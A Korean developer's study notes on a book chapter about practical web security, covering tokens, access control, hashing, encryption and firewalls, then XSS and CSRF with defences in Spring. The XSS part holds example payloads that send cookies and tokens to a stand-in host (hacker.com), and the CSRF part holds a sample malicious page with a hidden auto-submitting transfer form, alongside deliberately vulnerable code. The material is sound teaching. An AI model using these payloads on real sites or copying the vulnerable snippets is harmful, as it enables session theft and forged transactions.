# 🚓 8장 실무에서 꼭 필요한 보안 지식

## 🥅 책 읽기 전

- 가장 중요한데 신경을 덜 쓰기도 했고, 질문에 정확히 대답하지 못하는 보안 문제..
- 이번엔 남에게 설명할 수 있을 정도로 공부해보자.

## 📚 책 내용 정리

### 🚨 1. 보안 문제 인식

#### 현실적인 보안 문제들

| 문제 유형                | 설명                                     | 위험도  |
| ------------------------ | ---------------------------------------- | ------- |
| **미인증 요청 처리**     | 로그인 확인 없이 API 처리                | 🔴 높음 |
| **권한 미검증**          | 다른 사용자 데이터 접근 가능             | 🔴 높음 |
| **기존 비밀번호 미확인** | 비밀번호 변경 시 기존 비밀번호 확인 안함 | 🟡 중간 |

---

### 🔑 2. 인증과 토큰 시스템

#### 토큰 저장 방식 비교

| 방식            | 저장소    | 장점                                     | 단점                                         |
| --------------- | --------- | ---------------------------------------- | -------------------------------------------- |
| **외부 저장소** | DB/Redis  | • 토큰 완전 제어<br>• 강제 로그아웃 쉬움 | • 별도 저장소 필요<br>• 서버 부하 증가       |
| **JWT**         | 토큰 자체 | • 서버 구조 간단<br>• 수평 확장 용이     | • 네트워크 트래픽 증가<br>• 토큰 제어 어려움 |
| **서버 메모리** | 세션      | • 빠른 접근<br>• 구현 간단               | • 서버 재시작 시 손실<br>• 고정 세션 필요    |

#### 토큰 송수신 방법

| 방법     | 형식                          | 장점        | 단점           |
| -------- | ----------------------------- | ----------- | -------------- |
| **쿠키** | `Cookie: authToken=abc123`    | 자동 전송   | CSRF 위험      |
| **헤더** | `Authorization: Bearer token` | 보안성 좋음 | 수동 처리 필요 |

#### 토큰 보안 강화 방법

| 방법                   | 설명                        | 구현 복잡도     |
| ---------------------- | --------------------------- | --------------- |
| **유효 시간 제한**     | 생성 시점/마지막 접근 기준  | 🟢 쉬움         |
| **클라이언트 IP 비교** | 토큰 생성 IP와 현재 IP 비교 | 🟡 보통         |
| **토큰 무효화**        | 강제 로그아웃 기능          | 🔴 어려움 (JWT) |
| **토큰 재발급**        | Access + Refresh 토큰       | 🟡 보통         |

---

### 🛡️ 3. 인가와 접근 제어

#### 접근 제어 모델 비교

| 모델           | 구조             | 장점                                | 단점                                   | 적용 사례     |
| -------------- | ---------------- | ----------------------------------- | -------------------------------------- | ------------- |
| **RBAC**       | 역할 → 권한      | • 체계적 관리<br>• 대규모 조직 적합 | • 예외 처리 어려움<br>• 초기 설계 복잡 | 기업 시스템   |
| **직접 권한**  | 사용자 → 권한    | • 유연한 권한 부여<br>• 간단한 구조 | • 관리 복잡<br>• 일관성 유지 어려움    | 소규모 시스템 |
| **하이브리드** | 역할 + 직접 권한 | • 유연성 + 체계성                   | • 복잡한 로직                          | 중대형 시스템 |

#### 권한 검사 방법

| 방법              | 예시                                              | 사용 시점       |
| ----------------- | ------------------------------------------------- | --------------- |
| **애노테이션**    | `@PreAuthorize("hasRole('ADMIN')")`               | 컨트롤러 메서드 |
| **서비스 로직**   | `authService.hasPermission(user, "READ", "POST")` | 비즈니스 로직   |
| **필터/인터셉터** | URL 패턴 기반 권한 검사                           | 요청 전처리     |

---

### 🔒 4. 단방향 암호화 (해시)

#### 해시 알고리즘 비교

| 알고리즘    | 보안 강도 | 성능    | 권장도       | 용도          |
| ----------- | --------- | ------- | ------------ | ------------- |
| **BCrypt**  | 🔴 높음   | 🟡 보통 | ✅ 권장      | 비밀번호 저장 |
| **Argon2**  | 🔴 높음   | 🟡 보통 | ✅ 권장      | 비밀번호 저장 |
| **SHA-256** | 🟡 보통   | 🟢 빠름 | ⚠️ Salt 필수 | 파일 해시     |
| **MD5**     | 🟢 낮음   | 🟢 빠름 | ❌ 비권장    | 사용 금지     |

#### Salt 적용 전후 비교

| 구분              | Salt 없음                 | Salt 있음   |
| ----------------- | ------------------------- | ----------- |
| **보안성**        | 레인보우 테이블 공격 취약 | 공격 방어   |
| **동일 비밀번호** | 동일 해시값               | 다른 해시값 |
| **구현 복잡도**   | 간단                      | 약간 복잡   |

---

### 🔄 5. 양방향 암호화

#### 대칭키 vs 비대칭키

| 구분          | 대칭키 (AES)         | 비대칭키 (RSA)       |
| ------------- | -------------------- | -------------------- |
| **키 개수**   | 1개                  | 2개 (공개키, 개인키) |
| **속도**      | 🟢 빠름              | 🟡 느림              |
| **키 관리**   | 🔴 어려움            | 🟢 쉬움              |
| **사용 용도** | 대용량 데이터 암호화 | 키 교환, 전자서명    |

#### 암호화 용도별 선택

| 용도                 | 권장 방식 | 이유                        |
| -------------------- | --------- | --------------------------- |
| **DB 개인정보 저장** | AES-256   | 빠른 속도, 대용량 처리      |
| **API 통신**         | RSA + AES | 키 교환은 RSA, 데이터는 AES |
| **파일 암호화**      | AES-256   | 큰 파일 처리 효율적         |

---

### 🔐 6. HMAC 데이터 검증

#### HMAC 사용 사례

| 사용처          | 목적             | 구현 복잡도 |
| --------------- | ---------------- | ----------- |
| **API 서명**    | 요청 무결성 검증 | 🟡 보통     |
| **웹훅 검증**   | 발신자 인증      | 🟢 쉬움     |
| **파일 무결성** | 파일 변조 감지   | 🟡 보통     |

#### HMAC 장단점

| 장점                                                     | 단점                                                              |
| -------------------------------------------------------- | ----------------------------------------------------------------- |
| • 단순하고 효율적<br>• 낮은 구현 비용<br>• 강력한 보안성 | • 비밀 키 관리 어려움<br>• 키 유출 시 보안 취약<br>• 키 순환 복잡 |

---

### 🔥 7. 방화벽 트래픽 제어

#### 방화벽 유형

| 유형                | 예시                | 제어 수준   | 설정 복잡도 |
| ------------------- | ------------------- | ----------- | ----------- |
| **네트워크 방화벽** | AWS 보안 그룹       | IP, 포트    | 🟢 쉬움     |
| **웹 방화벽 (WAF)** | CloudFlare, AWS WAF | HTTP/HTTPS  | 🟡 보통     |
| **서버 방화벽**     | iptables, ufw       | 시스템 레벨 | 🔴 어려움   |

#### 인바운드 vs 아웃바운드

| 방향           | 기본 원칙   | 허용 예시                              | 차단 예시        |
| -------------- | ----------- | -------------------------------------- | ---------------- |
| **인바운드**   | 필수만 허용 | • HTTPS (443)<br>• SSH (22, 특정 IP만) | • 모든 기타 포트 |
| **아웃바운드** | 필수만 허용 | • DNS (53)<br>• HTTPS (443)            | • 임의 포트 접근 |

#### 포트별 보안 설정

| 포트       | 서비스     | 권장 접근 제한      |
| ---------- | ---------- | ------------------- |
| **22**     | SSH        | 관리자 IP만         |
| **80/443** | HTTP/HTTPS | 필요 시 전체 허용   |
| **3306**   | MySQL      | 웹서버에서만        |
| **6379**   | Redis      | 애플리케이션 서버만 |

---

### 📊 8. 감사 로그

#### 감사 로그 기록 대상

| 카테고리        | 기록 항목                    | 중요도  |
| --------------- | ---------------------------- | ------- |
| **인증**        | 로그인/로그아웃, 로그인 실패 | 🔴 높음 |
| **권한 변경**   | 역할 변경, 권한 부여/회수    | 🔴 높음 |
| **데이터 접근** | 민감 정보 조회, 수정, 삭제   | 🔴 높음 |
| **시스템 설정** | 서버 설정 변경, 정책 변경    | 🟡 중간 |

#### 감사 로그 필수 필드

| 필드           | 설명             | 예시                   |
| -------------- | ---------------- | ---------------------- |
| **사용자 ID**  | 작업 수행 사용자 | "user123"              |
| **액션**       | 수행된 작업      | "LOGIN", "DELETE_POST" |
| **리소스**     | 대상 자원        | "POST", "USER"         |
| **IP 주소**    | 클라이언트 IP    | "192.168.1.100"        |
| **타임스탬프** | 작업 시간        | "2024-01-15T10:30:00Z" |
| **결과**       | 성공/실패        | "SUCCESS", "FAILURE"   |

---

### 🎭 9. 데이터 노출 최소화

#### 데이터 마스킹 방법

| 데이터 유형      | 마스킹 방법          | 예시                    |
| ---------------- | -------------------- | ----------------------- |
| **전화번호**     | 중간 4자리 마스킹    | 010-\*\*\*\*-5678       |
| **이메일**       | 사용자명 일부 마스킹 | u\*\*\*@example.com     |
| **신용카드**     | 앞뒤 4자리만 표시    | 1234-\***\*-\*\***-5678 |
| **주민등록번호** | 뒷자리 전체 마스킹   | 123456-**\*\*\***       |

#### 접근 제한 방법

| 방법               | 설명                           | 구현 복잡도 |
| ------------------ | ------------------------------ | ----------- |
| **역할 기반 제한** | 관리자만 전체 정보 접근        | 🟢 쉬움     |
| **동적 마스킹**    | 사용자 권한에 따라 다른 마스킹 | 🟡 보통     |
| **접근 로그 분석** | 비정상 패턴 감지 후 차단       | 🔴 어려움   |

---

### 🚨 10. 비정상 접근 처리

#### 탐지 패턴

| 패턴 유형       | 탐지 조건               | 대응 방법          |
| --------------- | ----------------------- | ------------------ |
| **로그인 실패** | 5회 연속 실패           | 계정 일시 잠금     |
| **위치 이상**   | 평소와 다른 국가/지역   | 추가 인증 요구     |
| **기기 이상**   | 새로운 기기/브라우저    | 이메일 알림 + 인증 |
| **API 남용**    | 1분에 100회 초과 호출   | IP 차단            |
| **권한 위반**   | 권한 없는 API 반복 접근 | 계정 검토          |

#### 대응 단계별 액션

| 위험도        | 액션        | 예시               |
| ------------- | ----------- | ------------------ |
| **낮음**      | 로그 기록   | 새로운 기기 로그인 |
| **중간**      | 사용자 알림 | 이상 위치 접근     |
| **높음**      | 일시 차단   | 연속 로그인 실패   |
| **매우 높음** | 즉시 차단   | SQL 인젝션 시도    |

---

### 💻 11. 시큐어 코딩

#### SQL 인젝션 방지

| 방법                   | 안전도  | 사용 편의성 |
| ---------------------- | ------- | ----------- |
| **Prepared Statement** | 🟢 높음 | 🟢 쉬움     |
| **ORM 사용**           | 🟢 높음 | 🟢 쉬움     |
| **입력값 검증**        | 🟡 보통 | 🟡 보통     |
| **권한 최소화**        | 🟢 높음 | 🔴 어려움   |

#### 개발 시 보안 체크리스트

| 항목            | 중요도  | 구현 방법              |
| --------------- | ------- | ---------------------- |
| **입력값 검증** | 🔴 높음 | 타입, 길이, 형식 검증  |
| **출력 인코딩** | 🔴 높음 | XSS 방지용 HTML 인코딩 |
| **에러 처리**   | 🟡 중간 | 시스템 정보 노출 방지  |
| **HTTPS 강제**  | 🔴 높음 | 모든 통신 암호화       |
| **CORS 설정**   | 🟡 중간 | 허용 도메인 제한       |
| **CSRF 방지**   | 🟡 중간 | 토큰 기반 검증         |

#### 민감 정보 처리

| 정보 유형       | 저장 방법         | 전송 방법            |
| --------------- | ----------------- | -------------------- |
| **비밀번호**    | BCrypt 해시       | HTTPS                |
| **개인정보**    | AES 암호화        | HTTPS + 추가 암호화  |
| **API 키**      | 환경변수          | 헤더 (Authorization) |
| **DB 연결정보** | 환경변수/설정파일 | 내부 네트워크만      |

---

### 👤 12. 개인 보안 (개발자)

#### 개발 환경 보안

| 항목              | 권장 사항                  | 위험도  |
| ----------------- | -------------------------- | ------- |
| **비밀번호**      | 12자 이상 + 특수문자       | 🔴 높음 |
| **2FA 인증**      | 모든 중요 계정에 적용      | 🔴 높음 |
| **VPN 사용**      | 회사 네트워크 접근 시      | 🟡 중간 |
| **개발용 데이터** | 실제 고객 데이터 사용 금지 | 🔴 높음 |
| **정기 업데이트** | OS, 개발도구 보안 패치     | 🟡 중간 |

#### 코드 보안 관리

| 항목              | ❌ 나쁜 예                      | ✅ 좋은 예                                   |
| ----------------- | ------------------------------- | -------------------------------------------- |
| **하드코딩**      | `String password = "admin123"`  | `System.getenv("DB_PASSWORD")`               |
| **로그 출력**     | `log.info("Password: {}", pwd)` | `log.info("User authenticated: {}", userId)` |
| **Git 커밋**      | 설정파일에 API 키 포함          | `.gitignore`로 설정파일 제외                 |
| **테스트 데이터** | 실제 고객 정보 사용             | 가짜 데이터 생성                             |

## 🤔 질문

### ✅ 마이크로서비스 환경에서는 세션과 토큰 중 어떤 것이 더 적합한가요?

1. 세션 기반 인증

   - 작동 방식

     - 사용자가 로그인하면 서버에서 사용자의 인증 정보를 확인한 뒤, 고유한 세션 ID를 생성합니다.
     - 이 세션 ID는 서버에 저장되고, 사용자에게는 쿠키를 통해 전달됩니다.
     - 이후 사용자가 서버에 요청을 보낼 때, 쿠키에 포함된 세션 ID를 통해 서버에서 사용자 정보를 조회하여 인증을 처리합니다.

   - 특징

     - 서버 저장소 필요 : 서버는 활성 세션 ID를 저장하고 관리해야 합니다.
     - 상태 유지 : 세션 상태는 서버에서 유지되므로 서버는 stateful로 작동합니다.
     - 쿠키 의존성 : 세션 ID는 보통 쿠키에 저장됩니다.
     - 보안 : 서버에서 세션 데이터를 관리하므로 제어가 쉽지만, 세션 탈취 공격에 취약할 수 있습니다.

   - 장단점
     - 서버에서 사용자 상태를 완전히 제어할 수 있고, 세션 만료 또는 로그아웃 시 즉각적으로 무효화가 가능하지만, 서버 리소스를 많이 사용하며 확장성이 낮아 부하 분산이 어렵다고 합니다.

2. 토큰 기반 인증 (Stateless!)
   - 작동 방식
     - 사용자가 로그인 하면 서버는 사용자를 확인한 뒤, 암호화된 인증 토큰을 생성하여 클라이언트에 전달합니다.
     - 토큰을 클라이언트가 서버에 요청을 보낼 때 헤더에 포함되어 전달됩니다.
     - 서버는 요청을 처리할 때 토큰을 검증하여 사용자를 인증합니다.
   - 특징
     - 서버 저장소 불필요 : 서버는 토큰을 저장하지 않고, 요청 시마다 검증만 수행합니다.
     - 무상태 : 서버는 클라이언트의 상태를 유지하지 않습니다.
     - 토큰 독립성 : 토큰은 보통 쿠키가 아닌 HTTP 헤더에 저장되며, 쿠키와 독립적으로 작동할 수 있습니다.
     - 보안 : 토큰은 자체적으로 암호화되어 있으며, 만료 시간을 포함할 수 있습니다.
   - 장단점
     - 서버가 상태를 유지하지 않아 확장성이 높고, API 및 마이크로서비스 환경에 적합하며, 모바일 앱, 웹앱 모두에서 사용이 가능하지만, 토큰 만료 전까지는 서버에서 강제로 무효화하기 어렵습니다.

- 결론: **토큰 기반이 더 적합합니다.**

  - **이유:**
    1. **서비스 간 독립성**: 각 서비스가 독립적으로 토큰 검증 가능
    2. **세션 공유 불필요**: 세션 저장소를 공유할 필요 없음
    3. **수평 확장**: Stateless하기 때문에 수평 확장 용이

- 만약 세션에서 구현하려면?

  - 로드밸런서에서 sticky session 구현
    - Sticky Session: 특정 사용자의 모든 요청을 동일한 서버로 라우팅하는 로드밸런싱 방식
  - 세션 클러스터링 (Session Clustering)
    - 서버 간 로그인 정보가 담긴 세션을 공유
    - 실제 서비스와 관련없는 인프라적인 작업으로 서버 리소스를 많이 쓰게되는 단점 존재
  - 세션 스토리지를 외부 서버로 분리

- 쉽게 비유하지면
  - Sticky Session: 전담 웨이터 음식점
    - 고객이 처음 오면 특정 웨이터를 배정
    - 그 이후 방문할 때마다 같은 웨이터가 서빙
    - 웨이터: "어? 김○○님! 오늘도 평소처럼 아메리카노 드릴까요? 지난번에 설탕 빼달라고 하셨죠?"
  - Stateless: 공유 시스템 음식점
    - 고객이 오면 아무 웨이터나 서빙 가능
    - 모든 고객 정보는 중앙 컴퓨터 시스템에 저장
    - 웨이터는 고객 카드(토큰)를 스캔해서 정보 확인
    - 고객: "안녕하세요!" (고객카드 제시)
      - 웨이터: (카드 스캔) "김○○님 맞으시죠? 시스템에서 확인하니 평소에 아메리카노를 설탕 없이 드시는군요!"
      - → 누가 서빙해도 동일한 서비스

---

### ✅ XSS vs CSRF

| 구분      | XSS                            | CSRF                      |
| --------- | ------------------------------ | ------------------------- |
| 공격 위치 | 신뢰하는 사이트 내부           | 외부 사이트에서           |
| 실행 장소 | 내 브라우저에서 악성 코드 실행 | 서버에서 내 권한으로 처리 |
| 목표      | 정보 훔치기                    | 행동 조작하기             |

### ✅ XSS(Cross-Site Scripting) 공격을 방어하는 방법은? 의심 → 포장 → 규칙

- **XSS(Cross-Site Scripting)**는 **"믿었던 웹사이트에서 당하는 배신"**이라고 생각하시면 됩니다.

- 🏠 집에 비유하면

  - **일반 상황**: 친구 집에 놀러 갔는데 안전하게 놀고 옴
  - **XSS 공격**: 친구 집에 놀러 갔는데, 그 집에 숨어있던 도둑이 내 지갑을 훔쳐감

- 💻 실제 코드로 보면

  ```html
  <!-- 정상적인 웹페이지 -->
  <div>안녕하세요 김철수님!</div>

  <!-- XSS 공격이 일어난 웹페이지 -->
  <div>
    안녕하세요
    <script>
      alert("당신의 정보가 털렸습니다!");
    </script>
    님!
  </div>
  ```

#### 🔀 XSS의 3가지 유형 (비유 + 코드)

1. 🏪 Stored XSS (저장형) - "독이 든 음식"

   - **비유**: 피자가게 후기란에 독을 넣어놨는데, 그 후기를 보는 모든 사람이 중독됨
   - **실제 공격 코드**:
     ```java
     // ❌ 위험한 게시판 코드
     @PostMapping("/posts")
     public String createPost(@RequestParam String content) {
         Post post = new Post();
         post.setContent(content);  // 악성 스크립트가 그대로 저장됨!
         postRepository.save(post);
         return "redirect:/posts";
     }
     ```
   - **공격자가 입력하는 내용**:
     ```html
     좋은 상품이에요!
     <script>
       // 사용자 쿠키 정보를 해커 서버로 전송
       var cookie = document.cookie;
       fetch("http://hacker.com/steal?data=" + cookie);
     </script>
     ```
   - **결과**: 이 게시글을 보는 모든 사용자의 쿠키가 털림! 😱

2. 🔄 Reflected XSS (반사형) - "독이 든 편지"

   - **비유**: 악성 링크를 이메일로 보내서, 그 링크를 클릭한 사람만 피해
   - **취약한 검색 기능**:
     ```java
       // ❌ 위험한 검색 코드
       @GetMapping("/search")
       public String search(@RequestParam String query, Model model) {
           model.addAttribute("query", query);  // 사용자 입력이 그대로 출력됨!
           return "search-results";
       }
     ```
   - **템플릿 파일 (search-results.html)**:

     ```html
     <!-- ❌ 위험한 출력 -->
     <h2>검색어: <span th:utext="${query}"></span></h2>
     ```

   - **공격 URL**:

     ```
     https://shop.com/search?query=<script>alert('XSS 공격!')</script>
     ```

   - **결과**: 이 링크를 클릭한 사람의 브라우저에서 스크립트 실행! 😱

3. 📱 DOM-based XSS (DOM 기반) - "조작된 TV"

   - **비유**: TV는 멀쩡한데 리모컨이 조작되어서 이상한 채널이 나옴
   - **취약한 JavaScript 코드**:

     ```javascript
     // ❌ 위험한 JavaScript 코드
     function displayWelcome() {
       var name = location.hash.substring(1); // URL의 # 뒤 내용 가져오기
       document.getElementById("welcome").innerHTML = "Hello " + name; // 그대로 출력!
     }

     // 페이지 로드 시 실행
     window.onload = displayWelcome;
     ```

   - **공격 URL**:
     ```
     https://site.com/welcome.html#<script>alert('DOM XSS!')</script>
     ```
   - **결과**: 서버는 멀쩡하지만 브라우저에서 악성 스크립트 실행! 😱

#### 🛡️ 어떻게 막을까요? (방어 3단계)

1. 🚪 입구에서 검문 (입력 검증)

- **비유**: "수상한 놈은 들여보내지 마라!"

  ```java
  @Component
  public class XSSDefense {

      // 입력값 검증
      public boolean isValidInput(String input) {
          if (input == null) return true;

          // 위험한 패턴들 체크
          Pattern scriptPattern = Pattern.compile("<script[^>]*>.*?</script>",
                                                Pattern.CASE_INSENSITIVE);
          Pattern onEventPattern = Pattern.compile("on\\w+\\s*=",
                                                  Pattern.CASE_INSENSITIVE);

          // 하나라도 발견되면 위험!
          return !scriptPattern.matcher(input).find() &&
                !onEventPattern.matcher(input).find() &&
                !input.toLowerCase().contains("javascript:");
      }

      // 사용 예시
      @PostMapping("/posts")
      public String createPost(@RequestParam String content) {
          if (!xssDefense.isValidInput(content)) {
              throw new SecurityException("위험한 입력이 감지되었습니다!");
          }
          // 안전한 경우에만 저장
          postService.save(content);
          return "success";
      }
  }
  ```

2. 🔒 창고에서 안전 포장 (출력 인코딩)

- **비유**: "위험한 건 안전하게 포장해서 내보내라!"

```java
@Component
public class XSSDefense {

    // HTML 인코딩
    public String encodeForHTML(String input) {
        return StringEscapeUtils.escapeHtml4(input);
        // < → &lt;, > → &gt;, " → &quot; 등으로 변환
    }

    // JavaScript 인코딩
    public String encodeForJavaScript(String input) {
        return StringEscapeUtils.escapeEcmaScript(input);
        // " → \", ' → \', \ → \\ 등으로 변환
    }
}

// 컨트롤러에서 사용
@GetMapping("/posts/{id}")
public String viewPost(@PathVariable Long id, Model model) {
    Post post = postRepository.findById(id);

    // 출력 전에 안전하게 인코딩
    String safeContent = xssDefense.encodeForHTML(post.getContent());
    model.addAttribute("content", safeContent);

    return "post-view";
}
```

- **템플릿에서 안전한 출력**:

```html
<!-- ✅ 안전한 출력 (자동 인코딩) -->
<div th:text="${content}"></div>

<!-- ❌ 위험한 출력 (인코딩 없음) -->
<div th:utext="${content}"></div>
```

3. 🛡️ 보안 정책 설정 (CSP 헤더)

- **비유**: "우리 웹사이트에서는 이런 것만 허용한다!"

```java
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers ->
            headers.contentSecurityPolicy(
                "default-src 'self'; " +                    // 기본: 같은 도메인만
                "script-src 'self' https://trusted-cdn.com; " +  // 스크립트: 신뢰하는 곳만
                "style-src 'self' 'unsafe-inline'; " +      // CSS: 인라인 허용
                "img-src 'self' data: https:; " +           // 이미지: HTTPS만
                "object-src 'none'; " +                     // Flash 등: 완전 차단
                "base-uri 'self';"                          // Base URI: 같은 도메인만
            )
        );
        return http.build();
    }
}
```

4. 전역 XSS 필터 구현
   - **비유**: "모든 입구에 보안요원 배치"

```java
@Component
public class XSSFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                        FilterChain chain) throws IOException, ServletException {

        // 모든 요청을 안전한 래퍼로 감싸기
        XSSRequestWrapper wrappedRequest = new XSSRequestWrapper((HttpServletRequest) request);
        chain.doFilter(wrappedRequest, response);
    }
}

// 요청 래퍼 클래스
public class XSSRequestWrapper extends HttpServletRequestWrapper {

    public XSSRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    @Override
    public String getParameter(String parameter) {
        String value = super.getParameter(parameter);
        return cleanXSS(value);
    }

    @Override
    public String[] getParameterValues(String parameter) {
        String[] values = super.getParameterValues(parameter);
        if (values == null) return null;

        // 모든 값들을 정화
        for (int i = 0; i < values.length; i++) {
            values[i] = cleanXSS(values[i]);
        }
        return values;
    }

    private String cleanXSS(String value) {
        if (value == null) return null;

        // 위험한 패턴들 제거
        value = value.replaceAll("(?i)<script[^>]*>.*?</script>", "");
        value = value.replaceAll("(?i)javascript:", "");
        value = value.replaceAll("(?i)on\\w+\\s*=", "");
        value = value.replaceAll("(?i)eval\\s*\\(", "");

        return value;
    }
}
```

---

#### 🎬 실제 공격 vs 방어 시나리오

- 시나리오: 온라인 쇼핑몰 후기 시스템

**1. 공격자의 시도**:

```javascript
// 공격자가 후기에 작성하는 내용
const maliciousReview = `
상품 정말 좋아요! 5점 드립니다!
<script>
  // 사용자 정보 털어가기
  fetch('http://hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage.getItem('userToken'),
      currentUrl: window.location.href
    })
  });
</script>
`;
```

**2. 취약한 시스템 (공격 성공)**:

```java
// ❌ 위험한 코드 - 공격 성공!
@PostMapping("/reviews")
public String addReview(@RequestParam String content) {
    Review review = new Review();
    review.setContent(content);  // 악성 스크립트 그대로 저장!
    reviewRepository.save(review);
    return "redirect:/reviews";
}
```

```html
<!-- ❌ 위험한 템플릿 - 스크립트 실행됨! -->
<div th:utext="${review.content}"></div>
```

**3. 안전한 시스템 (공격 차단)**:

```java
// ✅ 안전한 코드 - 공격 차단!
@PostMapping("/reviews")
public String addReview(@RequestParam String content) {

    // 1단계: 입력 검증
    if (!xssDefense.isValidInput(content)) {
        return "error/invalid-input";
    }

    // 2단계: 정화해서 저장
    String cleanContent = xssDefense.sanitizeInput(content);

    Review review = new Review();
    review.setContent(cleanContent);
    reviewRepository.save(review);

    return "redirect:/reviews";
}

// 정화 메서드
public String sanitizeInput(String input) {
    // Jsoup 라이브러리로 HTML 정화
    return Jsoup.clean(input, Safelist.basicWithImages());
}
```

```html
<!-- ✅ 안전한 템플릿 - 자동 인코딩 -->
<div th:text="${review.content}"></div>
<!-- <script> → &lt;script&gt; 로 변환되어 실행 안됨 -->
```

---

#### 🔧 JavaScript에서의 XSS 방어

- DOM 조작 시 안전한 방법

```javascript
// ❌ 위험한 방법
function displayUserName(name) {
  document.getElementById("welcome").innerHTML = "Hello " + name;
  // name이 "<script>alert('XSS')</script>"라면 실행됨!
}

// ✅ 안전한 방법 1: textContent 사용
function displayUserName(name) {
  document.getElementById("welcome").textContent = "Hello " + name;
  // HTML이 아닌 텍스트로 처리되어 안전
}

// ✅ 안전한 방법 2: 인코딩 함수 사용
function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

function displayUserName(name) {
  const safeName = escapeHtml(name);
  document.getElementById("welcome").innerHTML = "Hello " + safeName;
}

// ✅ 안전한 방법 3: 템플릿 리터럴 + 인코딩
function displayUserName(name) {
  const safeName = escapeHtml(name);
  document.getElementById("welcome").innerHTML = `
    <span class="welcome">Hello ${safeName}!</span>
  `;
}
```

---

### ✅ CSRF(Cross-Site Request Forgery) 공격의 원리와 방어책은?

- **CSRF(Cross-Site Request Forgery)**는 **"나인 척 하면서 남의 일을 처리하는 사기"**
- 🏦 은행에 비유하면

  - **정상 상황**: 내가 직접 은행에 가서 "제 돈 100만원 이체해주세요"
  - **CSRF 공격**: 사기꾼이 내 도장을 훔쳐서 "김철수 돈 100만원 이체해주세요" (은행은 진짜 김철수인 줄 알고 처리)

- 💻 실제 웹에서는

  ```html
  <!-- 정상적인 이체 요청 (사용자가 직접 클릭) -->
  <form action="/transfer" method="POST">
    <input name="to" value="친구계좌" />
    <input name="amount" value="10000" />
    <button type="submit">이체하기</button>
  </form>

  <!-- CSRF 공격 (사용자 모르게 자동 실행) -->
  <form id="malicious" action="https://bank.com/transfer" method="POST">
    <input name="to" value="해커계좌" />
    <input name="amount" value="1000000" />
  </form>
  <script>
    document.getElementById("malicious").submit();
  </script>
  ```

- **핵심**: 사용자가 **로그인된 상태**에서 **모르는 사이에** 요청이 전송되는 것!

---

#### 🎬 CSRF 공격 시나리오 (단계별 + 코드)

- 시나리오: 온라인 뱅킹 해킹

**1단계: 사용자가 은행 사이트 로그인**

```java
// 정상적인 로그인 처리
@PostMapping("/login")
public String login(@RequestParam String username,
                   @RequestParam String password,
                   HttpServletResponse response) {

    if (authService.authenticate(username, password)) {
        // 쿠키에 인증 정보 저장
        Cookie authCookie = new Cookie("BANK_SESSION", "authenticated_user_123");
        authCookie.setPath("/");
        authCookie.setMaxAge(3600); // 1시간
        response.addCookie(authCookie);

        return "redirect:/dashboard";
    }
    return "login";
}
```

**2단계: 해커가 악성 웹사이트 준비**

```html
<!-- 해커의 악성 사이트 (http://evil-site.com) -->
<!DOCTYPE html>
<html>
  <head>
    <title>무료 쿠폰! 클릭하세요!</title>
  </head>
  <body>
    <h1>🎁 축하합니다! 무료 쿠폰 당첨!</h1>
    <p>아래 버튼을 클릭하면 쿠폰을 받을 수 있습니다!</p>

    <!-- 숨겨진 악성 폼 -->
    <form
      id="hiddenTransfer"
      action="https://mybank.com/transfer"
      method="POST"
      style="display:none;"
    >
      <input name="toAccount" value="해커계좌번호123456" />
      <input name="amount" value="1000000" />
      <input name="memo" value="기부금" />
    </form>

    <!-- 사용자가 보는 가짜 버튼 -->
    <button onclick="stealMoney()">🎁 쿠폰 받기</button>

    <script>
      function stealMoney() {
        // 사용자가 쿠폰 버튼을 클릭하면...
        alert("쿠폰을 확인 중입니다...");

        // 실제로는 은행 이체 요청을 보냄!
        document.getElementById("hiddenTransfer").submit();

        // 사용자는 모름
        setTimeout(() => {
          alert("죄송합니다. 쿠폰이 모두 소진되었습니다.");
        }, 1000);
      }
    </script>
  </body>
</html>
```

**3단계: 취약한 은행 서버**

```java
// ❌ CSRF에 취약한 이체 기능
@PostMapping("/transfer")
public String transfer(@RequestParam String toAccount,
                      @RequestParam int amount,
                      @CookieValue("BANK_SESSION") String session) {

    // 세션만 확인하고 바로 이체 처리
    if (sessionService.isValid(session)) {
        transferService.transfer(getCurrentUser(session), toAccount, amount);
        return "transfer-success";
    }

    return "redirect:/login";
}
```

**4단계: 공격 성공!**

```
사용자 김철수가 은행에 로그인한 상태
↓
해커 사이트에서 "쿠폰 받기" 버튼 클릭
↓
브라우저가 자동으로 은행 쿠키를 포함해서 이체 요청 전송
↓
은행 서버: "김철수가 맞네? 이체 처리!"
↓
김철수 계좌에서 100만원이 해커 계좌로 이체됨! 😱
```

---

#### 🛡️ CSRF 방어 방법 (4가지 + 코드)

1. 🎫 CSRF 토큰 방식 - "입장권 시스템"

- **비유**: 은행에서 번호표를 뽑고, 그 번호표와 함께 업무를 봐야 하는 시스템

```java
// ✅ CSRF 토큰을 사용한 안전한 이체 시스템
@Configuration
@EnableWebSecurity
public class CSRFConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf ->
            csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringRequestMatchers("/api/public/**")  // 공개 API는 제외
        );
        return http.build();
    }
}

// 안전한 이체 컨트롤러
@PostMapping("/transfer")
public String transfer(@RequestParam String toAccount,
                      @RequestParam int amount,
                      @RequestParam String _csrf,  // CSRF 토큰
                      HttpServletRequest request) {

    // Spring Security가 자동으로 CSRF 토큰 검증
    // 토큰이 없거나 틀리면 403 Forbidden 응답

    String userId = getCurrentUserId(request);
    transferService.transfer(userId, toAccount, amount);

    return "transfer-success";
}
```

- **안전한 HTML 폼**:

```html
<!-- ✅ CSRF 토큰이 포함된 안전한 폼 -->
<form action="/transfer" method="POST">
  <!-- Spring Security가 자동으로 CSRF 토큰 추가 -->
  <input type="hidden" name="_csrf" th:value="${_csrf.token}" />

  <label>받는 계좌:</label>
  <input name="toAccount" type="text" required />

  <label>금액:</label>
  <input name="amount" type="number" required />

  <button type="submit">이체하기</button>
</form>

<!-- Thymeleaf를 사용하면 더 간단 -->
<form action="/transfer" method="POST" th:action="@{/transfer}">
  <!-- th:action을 사용하면 CSRF 토큰 자동 추가 -->
  <input name="toAccount" type="text" required />
  <input name="amount" type="number" required />
  <button type="submit">이체하기</button>
